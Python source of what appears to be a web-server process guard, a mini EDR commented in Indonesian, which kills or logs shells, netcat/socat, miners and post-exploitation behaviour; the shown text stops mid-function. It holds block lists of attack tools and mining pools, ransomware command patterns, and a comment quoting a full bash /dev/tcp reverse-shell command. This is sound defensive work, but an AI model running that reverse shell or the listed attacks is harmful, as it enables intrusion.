#!/www/server/panel/pyenv/bin/python3
# ============================================================
# sentinel-proc.py
#
# Pengawas Proses Runtime (Anti-RCE / EDR Mini untuk Web Server).
#
# Memantau seluruh proses yang berjalan di bawah akun pekerja web
# (UID 1002 / user www). Mendeteksi dan mematikan seketika:
#   1. Shell interaktif / eksekusi shell (sh, bash, dash, zsh, ksh)
#   2. Utilitas reverse shell / tunneling (nc, netcat, ncat, socat)
#   3. Binary yang dieksekusi dari direktori sementara (/tmp, /dev/shm)
#   4. Binary ELF yang dieksekusi langsung dari dalam direktori webroot
#   5. Perkakas pemindaian / eksploitasi (nmap, masscan, sqlmap, gobuster)
#   6. Perilaku pasca-eksploitasi pada worker PHP (korupsi memori PHP, mis. PHP2Shell
#      CVE-2026-109618/109619): stdio ke soket jaringan, dropper curl/wget ke /tmp,
#      penyamaran nama proses, ptrace oleh akun web, crash worker berulang, serta
#      pemetaan memori eksekusi asing (memfd, /dev/shm, pustaka dari /tmp, ELF anonim)
#      lewat sentinel-memscan. Aturan baru ini sengaja sempit dan, kecuali yang
#      berkeyakinan tinggi, hanya mencatat (audit): tidak pernah mematikan master php-fpm.
#
# Bila mode 'enforce' aktif, proses penyerang dimatikan dengan SIGKILL
# dalam waktu < 1 detik, dicatat ke SQLite & berkas log, serta dikirim
# ke antrean notifikasi darurat.
# ============================================================
import os
import sys
import re
import shlex
import socket
import struct
import threading
import time
import signal
import sqlite3
import json
import logging
from datetime import datetime

CONF_FILE = os.environ.get("SENTINEL_CONF", "/www/server/sentinel/etc/guardd.conf")
DB_PATH = os.environ.get("SENTINEL_DB", "/www/server/sentinel/data/guardd.db")
LOG_FILE = os.environ.get("SENTINEL_PROC_LOG", "/www/server/sentinel/log/proc_alerts.log")
STATE_FILE = "/www/server/sentinel/run/proc_guard.state"
PID_FILE = "/www/server/sentinel/run/proc_guard.pid"

DEFAULT_WEB_UID = int(os.environ.get("SENTINEL_WEB_UID", "1002"))

# Kategori ancaman kritis yang wajib diblokir jika dijalankan oleh pekerja web
BLOCKED_SHELLS = frozenset([
    "sh", "bash", "dash", "zsh", "ash", "csh", "tcsh", "fish", "ksh"
])

BLOCKED_TOOLS = frozenset([
    "nc", "netcat", "ncat", "socat", "telnet", "rsh",
    "nmap", "masscan", "sqlmap", "nikto", "gobuster", "hydra",
    "gdb", "strace", "ltrace",
    # Perkakas manipulasi/tamper sistem yang dilarang keras untuk pekerja web
    "systemctl", "service", "iptables", "ip6tables", "nft", "ipset",
    "chattr", "chmod", "chown", "pkill", "killall", "crontab", "pkexec", "sudo"
])

# Kategori biner penambang kripto (Crypto Miners / Botnet Miners)
BLOCKED_MINERS = frozenset([
    "xmrig", "minerd", "cpuminer", "xmr-stak", "nanominer", "ccminer",
    "ethminer", "nbminer", "t-rex", "gminer", "phoenixminer", "srbminer",
    "bminer", "hellminer", "wildrig", "lolminer", "claymore", "teamredminer"
])

# Perkakas & perilaku ransomware (enkripsi paksa massal)
BLOCKED_RANSOM_TOOLS = frozenset([
    "vssadmin", "wbadmin", "bcdedit", "cipher"
])

# Argumen & protokol pertambangan kripto (Stratum, pool monero, dll)
CRYPTO_MINING_PATTERNS = (
    "stratum+tcp://", "stratum+ssl://", "stratum2+tcp://", "stratum+udp://",
    "stratum+tls://", "--donate-level", "--algo=rx/0", "--algo=cryptonight",
    "moneroocean", "supportxmr", "minexmr", "c3pool", "pool.hashvault",
    "nanopool.org", "nicehash.com", "f2pool.com", "antpool.com", "cryptonight"
)

# Pola perintah ransomware (enkripsi paksa massal)
RANSOMWARE_CMD_PATTERNS = (
    "openssl enc -aes", "gpg --batch --passphrase",
    "7z a -p", "rar a -hp", "zip -e -P"
)

SUSPICIOUS_DIRS = (
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/run/lock/"
)

# Binary yang diizinkan untuk pekerja web (proses normal web server, backup, dan git)
WHITELISTED_BASENAMES = frozenset([
    "nginx",
    "php-fpm",
    "mysqldump",
    "tar",
    "gzip",
    "bzip2",
    "zip",
    "unzip",
    "git",
    "git-remote-https",
    "git-remote-http",
    "git-remote-ftp",
    "git-remote-ftps",
    "git-upload-pack",
    "git-receive-pack",
    "ssh"
])

# Setup logger
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

running = True
scans_count = 0
alerts_count = 0
kills_count = 0
whitelisted_count = 0
seen_whitelisted_pids = set()

WHITELIST_FILE = os.environ.get("SENTINEL_PROC_WHITELIST", "/www/server/sentinel/etc/proc_whitelist.json")
_wl_cache = []
_wl_mtime = 0

def handle_signal(sig, frame):
    global running
    logging.info(f"Menerima sinyal {sig}, bersiap menghentikan watchdog...")
    running = False

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

def get_config_val(key, default=""):
    if not os.path.exists(CONF_FILE):
        return default
    try:
        with open(CONF_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" in line:
                    k, v = line.split("=", 1)
                    if k.strip() == key:
                        return v.split("#", 1)[0].strip()
    except Exception:
        pass
    return default

def get_mode():
    val = get_config_val("proc_guard", "enforce").lower()
    if val in ("enforce", "on", "1", "true"):
        # Membunuh proses (enforce) adalah fitur Pro. Tanpa lisensi Process Guard tetap berjalan sebagai AUDIT:
        # mencatat dan memberi tahu, tidak membunuh. Pengaturan operator tidak diubah, jadi pulih sendiri saat upgrade.
        return "audit"      # edisi Free: membunuh proses (proc_enforce) adalah fitur Pro; Process Guard berjalan AUDIT
    elif val in ("audit", "log"):
        return "audit"
    return "off"

def init_db():
    try:
        os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
        con = sqlite3.connect(DB_PATH, timeout=5.0)
        cur = con.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS proc_alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ts INTEGER,
                pid INTEGER,
                ppid INTEGER,
                uid INTEGER,
                exe TEXT,
                cmdline TEXT,
                cwd TEXT,
                rule TEXT,
                action TEXT
            )
        """)
        cur.execute("CREATE INDEX IF NOT EXISTS idx_proc_alerts_ts ON proc_alerts(ts)")
        # Skema sama dengan guardd.c: tanpa ini, urutan start (proc lebih dulu dari guardd) membuat INSERT notif
        # gagal dan alert ikut hilang.
        cur.execute("""
            CREATE TABLE IF NOT EXISTS notif (
                id INTEGER PRIMARY KEY AUTOINCREMENT, ts INTEGER, ip INTEGER,
                jenis TEXT, isi TEXT, terkirim INTEGER DEFAULT 0,
                coba INTEGER DEFAULT 0, galat TEXT)
        """)
        con.commit()
        con.close()
    except Exception as e:
        logging.error(f"Gagal inisialisasi tabel proc_alerts: {e}")

def record_alert(pid, ppid, uid, exe, cmdline, cwd, rule, action):
    now_ts = int(time.time())
    # 1. Simpan ke berkas log
    logging.warning(
        f"ANOMALI TERDETEKSI: PID={pid} PPID={ppid} EXE='{exe}' "
        f"CMD='{cmdline}' ATURAN={rule} TINDAKAN={action}"
    )
    # 2. Simpan ke SQLite
    try:
        init_db()
        con = sqlite3.connect(DB_PATH, timeout=3.0)
        cur = con.cursor()
        cur.execute("""
            INSERT INTO proc_alerts (ts, pid, ppid, uid, exe, cmdline, cwd, rule, action)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (now_ts, pid, ppid, uid, exe, cmdline, cwd, rule, action))
        
        # 3. Masukkan ke antrean notifikasi (notif) jika tindakan berupa KILLED, atau audit aturan PHP2Shell
        nama = _aturan_nama(rule)
        if action == "AUDIT" and nama in NOTIF_AUDIT:
            kunci = (nama, exe)
            if now_ts - _notif_ts.get(kunci, 0) >= 600:
                _notif_ts[kunci] = now_ts
                pesan = f"[ALERTA DEFENDER ELIT] Perilaku mencurigakan pada worker web (dicatat, tidak dihentikan):\nPID: {pid} (UID: {uid})\nExe: {exe}\nRinci: {cmdline[:200]}\nAturan: {rule}"
                cur.execute("""
                    INSERT INTO notif (ts, ip, jenis, isi, terkirim, coba, galat)
                    VALUES (?, 0, 'proc_alert', ?, 0, 0, '')
                """, (now_ts, pesan))
        if action == "KILLED":
            pesan = f"[ALERTA DEFENDER ELIT] Proses ilegal dimatikan:\nPID: {pid} (UID: {uid})\nEksekusi: {exe}\nCmd: {cmdline[:200]}\nAturan: {rule}"
            cur.execute("""
                INSERT INTO notif (ts, ip, jenis, isi, terkirim, coba, galat)
                VALUES (?, 0, 'proc_kill', ?, 0, 0, '')
            """, (now_ts, pesan))
            
        con.commit()
        con.close()
    except Exception as e:
        logging.error(f"Gagal mencatat anomali ke database: {e}")

def is_elf(path):
    try:
        with open(path, "rb") as f:
            magic = f.read(4)
            return magic == b"\x7fELF"
    except Exception:
        return False

def load_proc_whitelist():
    global _wl_cache, _wl_mtime
    if not os.path.exists(WHITELIST_FILE):
        return []
    try:
        mt = os.path.getmtime(WHITELIST_FILE)
        if mt != _wl_mtime:
            with open(WHITELIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
                _wl_cache = json.load(f)
            _wl_mtime = mt
    except Exception as e:
        logging.error(f"Gagal memuat proc_whitelist.json: {e}")
    return _wl_cache

# ---- pencocokan whitelist yang tidak bisa diakali lewat argumen ----
# Dulu "cmdline_match" adalah pencocokan SUBSTRING di seluruh baris perintah:
# "bash -c 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1 #git '" lolos sebagai "git ".
# Sekarang pola harus menjadi PERINTAH yang dijalankan (argumen pertama, atau
# sesudah peluncur seperti php/env/nice), dan untuk "sh -c" SETIAP segmen
# perintah harus diizinkan.
PELUNCUR = re.compile(r'^(php[0-9.]*|php-cli|python[0-9.]*|node|env|nice|ionice|timeout|nohup|sudo|-.*|.*=.*)$')
SHELL_AMAN = frozenset(['cd', 'export', 'set', 'true', ':', 'sleep', 'date', 'umask', 'echo',
                        'tee', 'grep', 'test', '['])
# Kata kunci shell di awal segmen dibuang dulu ("if ! grep ...", "then php84 artisan ...").
SHELL_KATA_KUNCI = frozenset(['if', 'then', 'else', 'elif', 'do', 'while', 'until', '!', '{', '('])
SHELL_PENUTUP = frozenset(['fi', 'done', '}', ')'])
SHELL_BAHAYA = re.compile(r'`|\$\(|/dev/(tcp|udp)/|\bbase64\b.*-d|\beval\b')
WEB_INDUK = frozenset(['php-fpm', 'nginx', 'httpd', 'apache2', 'lsphp', 'litespeed'])

def _cocok_perintah(pola, argv):
    """pola (huruf kecil, boleh beberapa kata) cocok dengan perintah argv?"""
    kata = pola.split()
    if not kata or not argv:
        return False
    toks = [os.path.basename(t).lower() for t in argv[:6]]
    for i in range(min(4, len(toks))):
        if i and not all(PELUNCUR.match(t) for t in toks[:i]):
            break
        seg = toks[i:i + len(kata)]
        if len(seg) == len(kata) and seg[:-1] == kata[:-1] and seg[-1].startswith(kata[-1]):
            return True
    return False


def _segmen_shell(argv):
    """Isi "sh -c <perintah>" dipecah per segmen (&&, ||, ;, |, baris baru).
    None bila bukan shell -c, atau bila memuat konstruksi berbahaya."""
    if len(argv) < 3 or os.path.basename(argv[0]).lstrip('-') not in BLOCKED_SHELLS:
        return None
    try:
        i = argv.index('-c')
    except ValueError:
        return None
    if i + 1 >= len(argv):
        return None
    isi = argv[i + 1]
    if SHELL_BAHAYA.search(isi):
        return []
    hasil = []
    for seg in re.split(r'&&|\|\||;|\||\n', isi):
        seg = seg.strip()
        if not seg:
            continue
        try:
            t = shlex.split(seg, comments=True)
        except ValueError:
            return []
        while t and (re.match(r'^[A-Za-z_][A-Za-z0-9_]*=', t[0]) or t[0] in SHELL_KATA_KUNCI):
            t = t[1:]
        if t and not (len(t) == 1 and t[0] in SHELL_PENUTUP):
            hasil.append(t)
    return hasil


def _leluhur(pid, maks=8):
    """Nama berkas eksekusi leluhur proses (induk dulu)."""
    hasil = []
    for _ in range(maks):
        try:
            with open(f"/proc/{pid}/stat", "r") as f:
                isi = f.read()
            pid = int(isi[isi.rindex(')') + 2:].split()[1])
        except Exception:
            break
        if pid <= 1:
            break
        try:
            hasil.append(os.path.basename(os.readlink(f"/proc/{pid}/exe")).replace(' (deleted)', ''))
        except Exception:
            hasil.append('')
    return hasil


def _tty(pid):
    try:
        with open(f"/proc/{pid}/stat", "r") as f:
            isi = f.read()
        return int(isi[isi.rindex(')') + 2:].split()[4]) != 0
    except Exception:
        return False


# ---- PHP2Shell: perilaku pasca-eksploitasi pada worker web ----
# Kerentanan memori PHP tidak punya tanda khas; yang terlihat adalah akibatnya. Aturan di bawah dikalibrasi pada worker
# produksi: php-fpm memegang soket listen di fd 0 dan anak exec() mewarisinya, rwx anonim itu SAH (JIT PHP, PCRE JIT),
# dan stdout systemd berupa soket UNIX. Karena itu hanya soket jaringan (tcp/udp) yang dihitung.
WORKER_EXE = frozenset(['php-fpm', 'php-cgi', 'lsphp', 'httpd', 'apache2', 'litespeed', 'frankenphp'])
# Runtime aplikasi web selain PHP (Node.js, Python, Ruby, Java, Deno, Bun, .NET). Server Go/Rust tidak punya nama
# khas: sentinel-memscan --auto memilihnya lewat soket LISTEN. Dipakai untuk aturan anak-worker dan pindaian terarah.
RUNTIME_RE = re.compile(r'^(node|nodejs|python[0-9.]*|gunicorn|uwsgi|uvicorn|ruby[0-9.]*|puma|java|deno|bun|dotnet)$')


def _induk_worker(pid):
    """Induk langsung proses adalah worker web, atau induknya shell (system()/exec() lewat sh -c) yang diluncurkan
    worker web. Kakek lain tidak dihitung: skrip cron Python milik akun web yang memanggil program lain bukan worker."""
    lel = _leluhur(pid, 2)
    if not lel:
        return False
    if _worker_web(lel[0]):
        return True
    return lel[0] in BLOCKED_SHELLS and len(lel) > 1 and _worker_web(lel[1])


def _worker_web(nama):
    """Nama berkas eksekusi (basename) adalah worker web PHP/server, atau runtime aplikasi."""
    nama = (nama or '').split(' ')[0]
    return nama in WORKER_EXE or bool(RUNTIME_RE.match(nama))
INTERP_RE = re.compile(r'^(perl|python[0-9.]*|php[0-9.]*|ruby|node|lua[0-9.]*|busybox)$')
DROPPER_RE = re.compile(r'^(curl|wget|fetch|lwp-download|aria2c|tftp)$')
MASQ_NAMA = frozenset(['php-fpm', 'nginx', 'sshd', 'systemd', 'apache2', 'httpd', 'cron', 'crond', 'rsyslogd'])
# Aturan yang hanya mencatat (tidak dibunuh walau mode enforce): keyakinan tidak cukup untuk SIGKILL.
SOLO_AUDIT = frozenset(['WORKER_ANAK_ASING', 'COMM_PALSU', 'PTRACE_WEB', 'WORKER_CRASH_BERULANG'])
# Aturan audit yang tetap masuk antrean notifikasi (pembunuhan selalu masuk).
NOTIF_AUDIT = frozenset(['WORKER_FD_SOCKET', 'WORKER_DROPPER', 'INTERP_TEMP_SCRIPT', 'PTRACE_WEB',
                         'WORKER_CRASH_BERULANG', 'MEM_MEMFD_EXEC', 'MEM_SHM_EXEC', 'MEM_TEMP_LIB',
                         'MEM_DELETED_EXEC', 'MEM_ELF_ANON'])
_seen_audit = {}        # pid -> set(nama aturan): satu catatan per proses per aturan
_notif_ts = {}          # (aturan, exe) -> waktu notifikasi terakhir (batas 1 per 10 menit)


def _aturan_nama(rule):
    return str(rule).split('(', 1)[0].split(' ', 1)[0]


def _inet_inodes():
    """Inode soket TCP/UDP (IPv4/IPv6) dari /proc/net. Hanya dibaca saat stdio proses berupa soket (jarang)."""
    ino = set()
    for f in ('tcp', 'tcp6', 'udp', 'udp6'):
        try:
            with open('/proc/net/' + f, 'r') as fh:
                next(fh, None)
                for ln in fh:
                    kol = ln.split()
                    if len(kol) > 9 and kol[9].isdigit():
                        ino.add(int(kol[9]))
        except OSError:
            pass
    return ino


def _stdio_inet(pid):
    """True bila stdout atau stderr proses adalah soket jaringan (reverse shell / bind shell)."""
    sok = []
    for fd in (1, 2):
        try:
            t = os.readlink(f"/proc/{pid}/fd/{fd}")
        except OSError:
            continue
        if t.startswith('socket:[') and t.endswith(']'):
            try:
                sok.append(int(t[8:-1]))
            except ValueError:
                pass
    if not sok:
        return False
    inet = _inet_inodes()
    return any(i in inet for i in sok)


def _komunikasi(pid):
    try:
        with open(f"/proc/{pid}/comm", "r") as f:
            return f.read().strip()
    except OSError:
        return ""


def _masquerade(pid, argv, basename, exe_path=''):
    """Nama yang diklaim (comm atau argv[0]) menyamar sebagai layanan sistem padahal berkasnya lain.
    Berkas di bawah /www/server/ (dipasang root, tidak bisa ditulis akun web) dikecualikan: nginx bawaan aaPanel
    memakai biner "webserver" dengan argv[0] "nginx: worker process" (ditemukan pada uji kering di produksi)."""
    if exe_path.startswith('/www/server/'):
        return ''
    klaim = ''
    comm = _komunikasi(pid)
    a0 = os.path.basename(argv[0].split(':')[0].strip()) if argv else ''
    if comm in MASQ_NAMA:
        klaim = comm
    elif a0 in MASQ_NAMA:
        klaim = a0
    elif argv and argv[0].startswith('php-fpm:'):
        klaim = 'php-fpm'
    b = basename.replace(' (deleted)', '')
    return klaim if klaim and klaim != b else ''



def check_process_whitelist(pid, ppid, uid, exe_path, cmdline, cwd, basename, argv=None, keras=False):
    """Periksa apakah proses cocok dengan salah satu aturan whitelist aktif.

    keras=True untuk pelanggaran yang tidak boleh dimaafkan oleh pola perintah,
    nama berkas, atau cwd (eksekusi dari /tmp, memfd, ELF di webroot, tamper):
    hanya induk root atau aturan exe_exact yang berlaku."""
    if argv is None:
        argv = cmdline.split() if cmdline else []
    # 1. Cek apakah diinisiasi oleh root / systemd (UID 0) via sudo / cron
    if ppid and ppid > 1:
        try:
            pst = os.stat(f"/proc/{ppid}")
            if pst.st_uid == 0:
                pexe = ""
                try:
                    pexe = os.readlink(f"/proc/{ppid}/exe")
                except Exception:
                    pass
                pbase = os.path.basename(pexe)
                if pbase in ("sudo", "cron", "crond", "systemd", "bash", "sh", "sshd", "su", "login"):
                    return True, "Root / Systemd / SSH Parent"
        except Exception:
            pass

    # 1b. Cek apakah diinisiasi oleh proses Git (git pull, git clone, git fetch, submodule, webhook)
    if ppid and ppid > 1:
        try:
            pexe = ""
            try:
                pexe = os.readlink(f"/proc/{ppid}/exe")
            except Exception:
                pass
            pbase = os.path.basename(pexe)
            if pbase in ("git", "git-remote-https", "git-remote-http", "git-remote-ftp", "git-remote-ftps", "git-upload-pack", "git-receive-pack"):
                return True, f"Git Subprocess ({pbase})"
        except Exception:
            pass

    # 2. Cek berkas proc_whitelist.json
    rules = load_proc_whitelist()
    cmd_lower = cmdline.lower() if cmdline else ""
    exe_clean = exe_path.strip() if exe_path else ""
    base_lower = basename.lower() if basename else ""
    cwd_clean = cwd.strip() if cwd else ""

    pola_cmd = []
    for r in rules:
        if r.get("enabled", True) and r.get("type", "cmdline_match").lower() in ("cmdline_match", "cmdline_contains"):
            pat = str(r.get("pattern", "")).strip().lower()
            if pat:
                pola_cmd.append((pat, r.get("name") or pat))
    segmen = _segmen_shell(argv)

    for r in rules:
        if not r.get("enabled", True):
            continue
        w_type = r.get("type", "cmdline_match").lower()
        pat = str(r.get("pattern", "")).strip()
        if not pat:
            continue
        pat_lower = pat.lower()
        if keras and w_type != "exe_exact":
            continue

        if w_type in ("cmdline_match", "cmdline_contains"):
            if segmen is not None:
                # sh -c: SEMUA segmen harus perintah aman atau cocok dengan pola
                if segmen and all(os.path.basename(t[0]) in SHELL_AMAN
                                  or any(_cocok_perintah(pc, t) for pc, _ in pola_cmd)
                                  for t in segmen) \
                        and any(_cocok_perintah(pat_lower, t) for t in segmen):
                    return True, r.get("name") or pat
            elif _cocok_perintah(pat_lower, argv):
                return True, r.get("name") or pat
        elif w_type == "exe_exact":
            if exe_clean == pat or exe_clean.endswith("/" + pat.lstrip("/")):
                return True, r.get("name") or pat
        elif w_type == "basename":
            if base_lower == pat_lower:
                return True, r.get("name") or pat
        elif w_type in ("cwd_match", "cwd_startswith"):
            if cwd_clean.startswith(pat) or cwd_clean == pat:
                return True, r.get("name") or pat

    return False, None

# ---- pemantauan exec seketika lewat proc connector (netlink) ----
# Polling 1 detik tidak melihat "sh -c" yang hidup beberapa milidetik (pola webshell
# system()/exec()). Kernel mengirim peristiwa PROC_EVENT_EXEC untuk SETIAP exec; proses itu
# langsung dinilai dengan aturan yang sama. Polling tetap berjalan sebagai cadangan (mis.
# saat kernel tidak mendukung connector atau pesan netlink hilang karena antrean penuh).
_EVAL_LOCK = threading.Lock()
EXEC_EVENTS = {"terima": 0, "aktif": False}
NETLINK_CONNECTOR, CN_IDX_PROC, CN_VAL_PROC = 11, 1, 1
PROC_CN_MCAST_LISTEN, PROC_EVENT_EXEC = 1, 0x00000002
PROC_EVENT_PTRACE, PROC_EVENT_COMM = 0x00000100, 0x00000200


def _pendengar_exec(target_uid, mode_fn):
    try:
        sk = socket.socket(socket.AF_NETLINK, socket.SOCK_DGRAM, NETLINK_CONNECTOR)
        sk.bind((os.getpid(), CN_IDX_PROC))
        isi = struct.pack("=I", PROC_CN_MCAST_LISTEN)
        cn = struct.pack("=IIIIHH", CN_IDX_PROC, CN_VAL_PROC, 0, 0, len(isi), 0) + isi
        nl = struct.pack("=IHHII", 16 + len(cn), 3, 0, 0, os.getpid()) + cn
        sk.send(nl)
        sk.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    except Exception as e:
        logging.warning(f"proc connector tidak tersedia, hanya polling: {e}")
        return
    EXEC_EVENTS["aktif"] = True
    logging.info("Pemantauan exec seketika (proc connector) aktif")
    while running:
        try:
            data = sk.recv(65536)
        except OSError:
            continue        # ENOBUFS saat banjir exec: polling menangkap sisanya
        nxt = 0
        while nxt + 16 <= len(data):
            off = nxt
            nlen = struct.unpack_from("=I", data, off)[0]
            if nlen < 16:
                break
            nxt = off + ((nlen + 3) & ~3)     # dihitung DULU: "continue" di bawah tidak boleh macet
            # nlmsghdr (16) + cn_msg (20) + proc_event: what, cpu, timestamp, pid, tgid
            if nlen >= 16 + 20 + 24:
                what = struct.unpack_from("=I", data, off + 36)[0]
                if what == PROC_EVENT_PTRACE and nlen >= 16 + 20 + 32:
                    # process_pid, process_tgid, tracer_pid, tracer_tgid (tracer 0 = lepas)
                    try:
                        _peristiwa_ptrace(struct.unpack_from("=I", data, off + 56)[0],
                                          struct.unpack_from("=I", data, off + 64)[0], target_uid, mode_fn())
                    except Exception as e:
                        logging.warning(f"galat menilai ptrace: {e}")
                elif what in (PROC_EVENT_EXEC, PROC_EVENT_COMM):
                    # COMM = prctl(PR_SET_NAME)/pthread_setname_np: dinilai ulang untuk penyamaran nama proses
                    tgid = struct.unpack_from("=I", data, off + 56)[0]
                    EXEC_EVENTS["terima"] += 1
                    mode = mode_fn()
                    if mode != "off" and tgid > 1:
                        snap = _snapshot(tgid)     # sebelum apa pun: proses bisa keluar < 1 ms
                        if snap is None or snap["uid"] == 0:
                            continue
                        # Worker yang menjalankan proses anak (system/exec/proc_open) adalah titik paling mungkin
                        # tempat kode asing sudah dimuat: pindai memorinya SEKARANG, bukan menunggu putaran 30 dtk.
                        if what == PROC_EVENT_EXEC and snap["ppid"] > 1:
                            try:
                                if _worker_web(os.path.basename(os.readlink(f"/proc/{snap['ppid']}/exe"))):
                                    memscan_minta(snap["ppid"])
                            except OSError:
                                pass
                        try:
                            with _EVAL_LOCK:
                                _periksa_pid(tgid, target_uid, mode, [], snap=snap)
                        except Exception as e:
                            logging.warning(f"galat menilai PID {tgid}: {e}")


def _peristiwa_ptrace(tracee, tracer, target_uid, mode):
    """Akun web melampirkan ptrace ke proses lain: dipakai untuk menyuntik worker lain atau membaca memorinya.
    Hanya dicatat (audit); gdb/strace sudah dibunuh oleh BLOCKED_TOOLS."""
    if mode == "off" or tracer <= 1 or tracee == tracer:
        return
    snap = _snapshot(tracer)
    if snap is None or snap["uid"] == 0:
        return
    if not (snap["uid"] == target_uid or snap["uid"] == DEFAULT_WEB_UID or snap["uid"] == 33):
        return
    sudah = _seen_audit.setdefault(tracer, set())
    if "PTRACE_WEB" in sudah:
        return
    sudah.add("PTRACE_WEB")
    try:
        tgt = os.path.basename(os.readlink(f"/proc/{tracee}/exe"))
    except OSError:
        tgt = "?"
    exe = snap["exe"]
    cmd = " ".join(snap["argv"])
    global alerts_count
    alerts_count += 1
    record_alert(tracer, snap["ppid"], snap["uid"], exe, f"ptrace -> PID {tracee} ({tgt}) {cmd[:100]}", snap["cwd"],
                 f"PTRACE_WEB({os.path.basename(exe)}->{tgt})", "AUDIT")


# ---- crash worker PHP berulang (tanda percobaan eksploitasi memori) ----
FPM_LOG_GLOB = os.environ.get("SENTINEL_FPM_LOG_GLOB", "/www/server/php/*/var/log/php-fpm.log")
CRASH_RE = re.compile(r"child (\d+) exited on signal (4|6|7|8|11) ")
CRASH_JENDELA, CRASH_AMBANG, CRASH_JEDA = 300, 3, 600
_crash_ts = []
_crash_alert_ts = 0
_crash_pos = {}


def _baca_crash(sekarang):
    """Baca baris baru log php-fpm; kembalikan jumlah crash (SEGV/ABRT/BUS/ILL/FPE) di jendela terakhir."""
    import glob
    for path in glob.glob(FPM_LOG_GLOB):
        try:
            st = os.stat(path)
        except OSError:
            continue
        ino, pos = _crash_pos.get(path, (st.st_ino, None))
        if pos is None or ino != st.st_ino or st.st_size < pos:
            # pertama kali / dirotasi: mulai dari akhir (riwayat lama bukan peristiwa baru), atau dari awal bila dirotasi
            pos = st.st_size if pos is None else 0
        if st.st_size > pos:
            try:
                with open(path, "rb") as f:
                    f.seek(max(pos, st.st_size - 1048576))
                    baru = f.read(1048576).decode("utf-8", errors="ignore")
                for ln in baru.splitlines():
                    if CRASH_RE.search(ln):
                        _crash_ts.append(sekarang)
            except OSError:
                pass
        _crash_pos[path] = (st.st_ino, st.st_size)
    _crash_ts[:] = [t for t in _crash_ts if sekarang - t <= CRASH_JENDELA]
    return len(_crash_ts)


def _pantau_crash():
    global alerts_count, _crash_alert_ts
    while running:
        try:
            if get_mode() != "off":
                now = time.time()
                n = _baca_crash(now)
                if n >= CRASH_AMBANG and now - _crash_alert_ts >= CRASH_JEDA:
                    _crash_alert_ts = now
                    alerts_count += 1
                    record_alert(0, 0, 0, "php-fpm", f"{n} worker crash (SEGV/ABRT/BUS) dalam {CRASH_JENDELA // 60} menit",
                                 "", f"WORKER_CRASH_BERULANG({n})", "AUDIT")
        except Exception as e:
            logging.warning(f"pantau crash worker gagal: {e}")
        for _ in range(20):
            if not running:
                return
            time.sleep(1)


# edisi Free: pemindai memori worker (memscan) adalah fitur Pro; antarmuka pemanggil tetap ada tanpa isi.
def memscan_minta(pid):
    return False


def _pemindai_memori(mode_fn):
    return


def pangkas_alert(hari=30):
    """proc_alerts dulu tumbuh tanpa batas (cron yang di-whitelist = satu baris per menit)."""
    try:
        con = sqlite3.connect(DB_PATH, timeout=5.0)
        con.execute("DELETE FROM proc_alerts WHERE ts < ?", (int(time.time()) - hari * 86400,))
        con.commit()
        con.close()
    except Exception as e:
        logging.warning(f"pangkas proc_alerts gagal: {e}")


def _snapshot(pid):
    """Baca identitas proses SECEPAT mungkin (dipanggil begitu peristiwa exec tiba):
    shell dari system() bisa keluar dalam < 1 ms. None bila proses sudah hilang."""
    d = f"/proc/{pid}"
    try:
        uid = os.stat(d).st_uid
    except (FileNotFoundError, ProcessLookupError, PermissionError):
        return None
    snap = {"uid": uid, "exe": "", "argv": [], "cwd": "", "ppid": 0}
    if uid == 0:
        return snap
    try:
        snap["exe"] = os.readlink(d + "/exe")
    except Exception:
        pass
    try:
        with open(d + "/cmdline", "rb") as f:
            snap["argv"] = [x.decode("utf-8", errors="ignore") for x in f.read().split(b"\x00") if x]
    except Exception:
        pass
    try:
        with open(d + "/stat", "r") as f:
            isi = f.read()
        snap["ppid"] = int(isi[isi.rindex(")") + 2:].split()[1])
    except Exception:
        pass
    try:
        snap["cwd"] = os.readlink(d + "/cwd")
    except Exception:
        pass
    return snap


def _periksa_pid(pid, target_uid, mode, found, snap=None):
    """Nilai satu proses dan tindak bila melanggar. Dipakai oleh pemindaian berkala
    (scan_once) dan oleh pendengar peristiwa exec (proc connector, dengan snapshot yang
    sudah diambil: proses yang keluar sebelum dinilai tetap tercatat)."""
    global alerts_count, kills_count, whitelisted_count, seen_whitelisted_pids
    if snap is None:
        snap = _snapshot(pid)
    if snap is None:
        return
    st_uid = snap["uid"]
    # Lewati proses root (UID 0) - root memiliki kendali penuh
    if st_uid == 0:
        return
    is_web_user = (st_uid == target_uid or st_uid == DEFAULT_WEB_UID or st_uid == 33)
    exe_path = snap["exe"]
    argv = snap["argv"]
    cmdline = " ".join(argv)
    cwd = snap["cwd"]
    ppid = snap["ppid"]

    basename = os.path.basename(exe_path) if exe_path else ""
    if not basename and cmdline:
        basename = os.path.basename(cmdline.split()[0])

    # Biner yang berjalan dari /tmp, /dev/shm, memfd, atau berkas yang sudah
    # dihapus TIDAK boleh lolos lewat nama aman: "cp /bin/bash /dev/shm/php-fpm"
    # dulu melewati seluruh pemeriksaan.
    exe_curiga = bool(exe_path) and (
        any(exe_path.startswith(d) for d in SUSPICIOUS_DIRS)
        or exe_path.startswith("/memfd:") or exe_path.endswith(" (deleted)"))
    if basename in WHITELISTED_BASENAMES and not exe_curiga:
        return

    # Evaluasi aturan deteksi pelanggaran
    rule_violation = None
    # Deteksi apakah perintah adalah operasi Git resmi (git pull, clone, fetch, checkout)
    is_git_cmd = (basename in ("git", "git-remote-https", "git-remote-http", "git-upload-pack", "git-receive-pack", "ssh")) or \
                 (cmdline and any(cmdline.strip().startswith(prefix) for prefix in ("git ", "/usr/bin/git ", "git-", "/usr/bin/git-")))

    # Aturan Proteksi Benteng Anti-Tamper:
    # Berlaku untuk SEMUA user non-root (UID != 0)!
    # Melarang keras modifikasi, uninstall, penghapusan, atau penghentian Sentinel & plugin panel.
